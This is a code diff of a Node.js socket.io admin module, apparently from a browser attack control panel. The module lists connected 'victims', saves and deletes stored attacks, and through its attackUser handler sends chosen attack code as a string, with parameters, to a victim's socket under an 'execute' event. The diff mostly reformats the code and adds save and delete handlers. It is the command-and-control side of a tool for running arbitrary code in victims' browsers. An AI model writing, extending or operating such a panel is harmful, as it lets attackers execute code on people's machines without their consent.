@@ -1,57 +1,73 @@
-const socketio = require('socket.io');
-const victimSockets = require('../victim/sockets');
-const server = require('../../server');
-const attack = require('../../db/controllers/attack');
+const socketio = require('socket.io')
+const victimSockets = require('../victim/sockets')
+const server = require('../../server')
+const Attack = require('../../db/controllers/attack')
 
 module.exports.listen = function (app) {
-  let io = socketio.listen(app);
+  let io = socketio.listen(app)
 
   io.on('connection', function (socket) {
 
-    console.log('admin connected');
-
-    socket.join('admins');
+    console.log('admin connected')
 
     module.exports.emit = function (eventName, data) {
-      io.to('admins').emit(eventName, data);
-    };
-    
-    socket.on('getUsers', module.exports.getUsers);
+      io.to('admins').emit(eventName, data)
+    }
 
-    socket.on('getAttacks', module.exports.getAttacks);
+    socket.join('admins')
 
-    socket.on('disconnect', module.exports.disconnect);
-
-    socket.on('attackUser', module.exports.attackUser);
-
-  });
-
-  return io;
-};
-
-module.exports.getUsers = function () {
-  victimSockets.sockets.forEach(function(user){
-    module.exports.emit('newUser', user);
-  });
-};
-
-module.exports.getAttacks = function () {
-  attack.findAll((attacks)=>{
-    module.exports.emit('attacks', assembleAttacks(attacks));
+    socket.on('attackUser', attackUser)
+    socket.on('disconnect', disconnect)
+    socket.on('getAttacks', getAttacks)
+    socket.on('getUsers', getUsers)
+    socket.on('saveAttack', saveAttack)
+    socket.on('deleteAttack', deleteAttack)
   })
-};
 
-module.exports.disconnect = function () {
-  console.log('admin disconnected');
-};
+  return io
+}
 
-module.exports.attackUser = function (data) {
-  // console.log("received instructions to use attack " + data.attack + " on " + data.userSocket);
+function saveAttack(attack){
+  Attack.save(Attack.translateForDB(attack)).then(()=>{
+    getAttacks()
+  })
+  .catch((err)=>{
+    console.log(err)
+  })
+}
+
+function deleteAttack(attackId){
+  Attack.deleteById(attackId).then(()=>{
+    getAttacks()
+  })
+  .catch((err)=>{
+    console.log(err)
+  })
+}
+
+function getUsers() {
+  victimSockets.sockets.forEach((user)=>{
+    module.exports.emit('newUser', user)
+  })
+}
+
+function getAttacks() {
+  Attack.findAll((attacks)=>{
+    module.exports.emit('attacks', assembleAttacks(attacks))
+  })
+}
+
+function disconnect() {
+  console.log('admin disconnected')
+}
+
+function attackUser(data) {
+  // console.log("received instructions to use attack " + data.attack + " on " + data.userSocket)
   server.ioVictim.to(data.userSocket).emit('execute', {
     func: `var attack = ${data.attack.toString()}`,
     params: data.params
-  });
-};
+  })
+}
 
 module.exports.emit = ()=>{
   //need to define the emit function to prevent errors when a victim connects before an admin
